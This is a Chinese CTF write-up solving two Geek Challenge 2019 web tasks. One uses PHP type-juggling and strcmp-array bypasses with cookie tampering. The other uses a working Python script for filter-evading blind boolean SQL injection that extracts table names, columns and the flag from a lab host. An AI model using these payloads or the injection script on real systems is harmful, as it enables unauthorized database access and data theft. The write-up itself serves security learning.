# 极客大挑战 2019

## Web

### BuyFlag

通过查看 `index.php` 源代码可以发现 `pay.php`，通过查看 `pay.php` 源代码可以发现以下内容

```php
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

通过构造 payload `password="404"` 发现并没有什么反应，然后继续在 NetWork 里面寻找答案。在寻找的过程中，发现 Request Headers 内包含 Cookie `user=0` ，故尝试修改为 `user=1` 后出现新提示 Wrong Password。因此重新构造 payload `password=404a` 发现成功力，但是提示需要给钱（

> is\_numeric() 函数用于检测变量是否为数字或数字字符串
>
> 但当一个整型和一个其他类型行比较的时候，会先把其他类型数字化再比，因此可以通过空字符 `%00` 或字母实现绕过
>
> strcmp() 函数用于比较两个字符串
>
> 若传入的参数为数组则返回 NULL ，NULL==0 为 bool(true)，因此可以通过传入数组进行绕过

尝试构造 payload `money=100000000` 发现提示 Nember lenth is too long，故修改 payload 为 `money[]=1`

### FinalSQL

通过测试发现并不存在单双引号，空格、`and` 也被过滤了，`/**/` 绕过也不行，并不存在报错注入，尝试布尔注入。

```python
import time
import requests

url = 'http://f5e437d3-ba10-41e1-a677-dab0531a7037.node4.buuoj.cn:81/search.php'
results = []
session = requests.Session()

for i in range(1,43):
    start = 32
    end = 127
    for j in range(start, end):
        mid = (start + end) // 2
        data = {"id": f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"}
        time.sleep(0.1)
        ret = session.get(url, params=data)
        #print(ret.text)
        if 'NO!' in ret.text:
            start = mid
        else:
            end = mid
        if (end - start) <= 1:
            results.append(chr(end))
            print(''.join(results))
            break
```

可以得到表名 `F1naI1y,Flaaaaag` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),{i},1))>{mid})"}
```

可以得到列名 `id,fl4gawsl` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))>{mid})"}
```

得到回显 `NO!!Not!this!!Click!others~~~,yingyingying` ，看来被骗了，那就修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))>{mid})"}
```

得到回显 `id,username,password` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(username))from(F1naI1y)),{i},1))>{mid})"}
```

得到回显 `mygod,welcome,site,site,site,site,Syc,finally,flag` ，看来离成功更进一步了（确信），修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))>{mid})"}
```

得到回显 `flag{301e4296-b8db-462e-a4e0-6253e9b8dafe}` 。
